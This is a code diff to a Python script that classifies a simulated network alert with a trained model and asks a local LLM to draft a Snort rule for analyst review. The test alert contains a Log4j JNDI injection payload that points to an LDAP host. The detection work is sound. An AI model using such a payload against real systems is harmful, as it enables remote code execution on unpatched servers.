@@ -1,11 +1,11 @@
 import joblib
 import ollama
+import pandas as pd
 
 def generate_snort_rule_prompt(alert_info):
     """
     Constructs a detailed prompt for Ollama to generate a Snort rule.
     """
-    # Using f-string for a clean, multi-line prompt
     prompt = f"""
     As a senior cybersecurity analyst, you have been tasked with writing a Snort 3 rule.
     A new, suspicious network event has been detected with the following details:
@@ -25,12 +25,15 @@ def generate_snort_rule_prompt(alert_info):
 
 # --- Main Execution ---
 if __name__ == "__main__":
-    # 1. Load the pre-trained model and vectorizer
-    model = joblib.load('decision_tree_model.joblib')
-    vectorizer = joblib.load('tfidf_vectorizer.joblib')
+    # 1. Load the pre-trained model pipeline
+    try:
+        model_pipeline = joblib.load('random_forest_pipeline.joblib')
+    except FileNotFoundError:
+        print("Error: Model pipeline file 'random_forest_pipeline.joblib' not found.")
+        print("Please run the updated train_model.py script first to create it.")
+        exit()
 
-    # 2. Simulate a new, unseen, suspicious alert
-    # This log simulates a potential log4j attack, which our model has never seen.
+    # 2. Simulate a new, unseen, suspicious alert (Log4j)
     new_alert_text = 'GET /?payload=${jndi:ldap://192.168.1.6:1389/a} HTTP/1.1'
     new_alert_info = {
         'message': new_alert_text,
@@ -39,14 +42,20 @@ if __name__ == "__main__":
         'protocol': 'tcp'
     }
 
-    # 3. Use our trained model to classify the new alert
-    vectorized_alert = vectorizer.transform([new_alert_text])
-    prediction = model.predict(vectorized_alert)
+    # Create a pandas DataFrame from the new alert, as the pipeline expects it
+    new_alert_df = pd.DataFrame([{
+        'message': new_alert_info['message'],
+        'dest_port': int(new_alert_info['dest_port'])
+    }])
+
+    # 3. Use our improved model pipeline to classify the new alert
+    prediction = model_pipeline.predict(new_alert_df)
 
     # 4. If the model classifies it as malicious, ask Ollama for a rule
-    if True: # Forcing malicious classification to trigger Ollama
-        print(f"Malicious activity detected: '{new_alert_text}'")
-        print("Asking Ollama to generate a new Snort rule...")
+    if prediction[0] == 1:
+        print(f"SUCCESS: The improved model correctly classified the new threat as MALICIOUS.")
+        print(f"Detected activity: '{new_alert_text}'")
+        print("\nAsking Ollama to generate a new Snort rule...")
         
         prompt = generate_snort_rule_prompt(new_alert_info)
         
@@ -62,9 +71,8 @@ if __name__ == "__main__":
             print(suggested_rule)
             print("---------------------------------------")
 
-            # This simulates the "Feedback Loop" where an analyst can approve the rule
             with open("suggested_rules.txt", "a") as f:
-                f.write(suggested_rule + "\n")
+                f.write(suggested_rule + "\n\n")
             print("Rule saved to suggested_rules.txt for analyst review.")
 
         except Exception as e:
@@ -72,4 +80,5 @@ if __name__ == "__main__":
             print("Please ensure the Ollama service is running and you have the 'llama3' model.")
             
     else:
-        print("The new alert was classified as benign. No action taken.")
+        print(f"FAILURE: The improved model still classified the new threat as BENIGN.")
+        print("This indicates more diverse training data or more advanced features are needed.")
